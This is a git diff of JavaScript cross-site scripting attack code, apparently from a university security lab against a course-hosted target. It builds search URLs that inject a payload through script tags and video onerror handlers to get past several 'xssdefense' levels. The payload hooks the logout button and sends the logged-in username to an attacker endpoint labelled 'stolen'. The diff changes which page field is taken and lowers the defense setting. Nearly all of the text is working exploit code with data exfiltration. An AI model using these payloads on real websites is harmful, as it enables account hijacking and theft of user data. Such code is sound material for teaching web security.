@@ -59,7 +59,7 @@ function payload(attacker) {
 			$(/#log-out-btn/.source).click(function(event)
 			{
 				event.preventDefault();
-				$.get(attacker,{event: /logout/.source, user:$(/#username/.source).val()});
+				$.get(attacker,{event: /logout/.source, user:$(/#logged-in-user/.source).text()});
 				$.post(link + /logout/.source,function(){
 					history.pushState(null,null,x);
 					proxy(x);
@@ -96,6 +96,9 @@ function payload(attacker) {
 	$("html").hide();
 	proxy(x);
 }
+
+
+
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
@@ -114,7 +117,7 @@ function makeLink(xssdefense, target, attacker) {
             return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<video src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
             break;
         case 4:
-        	return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + decodeURIComponent(letsSee.toString());
+        	return 0;
 	}
 	}
 }
@@ -122,7 +125,7 @@ function makeLink(xssdefense, target, attacker) {
 
 
 var letsSee = "%22%3Cscript%22%2B%22%3E%22%2Bpayload.toString%28%29%2B%22%3Bpayload%28%5C%22%22%2Battacker%2B%22%5C%22%29%3B%3C%2Fscript%22%2B%22%3E%22%29";
-var xssdefense = 3;
+var xssdefense = 0;
 var target = "http://trurl.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
